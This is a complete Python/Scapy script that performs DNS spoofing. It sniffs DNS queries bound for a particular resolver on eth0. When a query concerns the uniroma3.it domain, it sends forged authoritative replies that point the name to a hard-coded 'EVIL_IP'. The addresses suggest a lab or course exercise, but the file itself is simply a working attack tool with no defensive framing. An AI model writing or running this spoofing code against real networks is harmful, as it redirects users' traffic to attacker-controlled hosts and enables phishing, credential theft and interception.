#!/usr/bin/env python3
from scapy.all import DNSQR , DNS , IP , UDP , DNSRR , send ,sniff , Ether , sendp
EVIL_IP = "210.0.3.50"
DNS_UNI_IP = "110.0.0.10"
INTERFACE = "eth0"
TARGET_DOMAIN = "uniroma3.it"
def dns_spoof(pkt):
    if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0 and pkt[IP].dst == DNS_UNI_IP:        
        qname = pkt[DNSQR].qname.decode()
        if TARGET_DOMAIN in qname:
            ether_layer = Ether(dst=pkt[Ether].src, src=pkt[Ether].dst)
            ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
            udp_layer = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
            dns_layer = DNS(
                id=pkt[DNS].id,
                qr=1,
                aa=1,
                ra=1,
                qd=pkt[DNS].qd,
                an=DNSRR(rrname=qname, type='A', rclass='IN', ttl=600, rdata=EVIL_IP)
            )
            spoofed_pkt = ether_layer/ip_layer/udp_layer/dns_layer
            sendp(spoofed_pkt, iface=INTERFACE, verbose=False)            
try:
    sniff(iface=INTERFACE, filter=f"udp port 53 and dst host {DNS_UNI_IP}", prn=dns_spoof, store=0)
except KeyboardInterrupt:
    print("\n[*] Attack stopped by user.")